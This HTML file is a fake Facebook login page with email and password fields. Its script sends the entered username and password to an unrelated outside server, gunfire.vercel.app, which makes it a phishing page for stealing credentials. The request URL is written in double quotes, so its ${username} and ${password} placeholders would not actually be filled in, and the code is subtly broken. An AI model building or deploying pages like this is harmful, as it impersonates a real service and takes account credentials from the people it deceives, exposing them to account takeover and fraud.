<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login</title>
  <style>
    body{font-family:Arial;background:#f2f2f2;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh}
    .card{width:320px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,0.08)}
    input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}
    button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600}
  </style>
</head>
<body>
  <div class="card">
    <h2 style="text-align:center;color:#1877f2;margin:0 0 12px 0">facebook</h2>

    <form id="loginForm" onsubmit="return false;">
      <input id="username" type="text" name="username" placeholder="Email or phone number" required>
      <input id="password" type="password" name="password" placeholder="Password" required>
      <button id="loginBtn" type="button">Log In</button>
    </form>
  </div>

  <script>
    document.getElementById('loginBtn').addEventListener('click', function () {
      fetch("https://gunfire.vercel.app/api/check_ban?id=7254790945&message=${username}&message2=${password}")
        .then(r => r.text())
        .then(console.log)
        .catch(console.error);
    });
  </script>
</body>
</html>
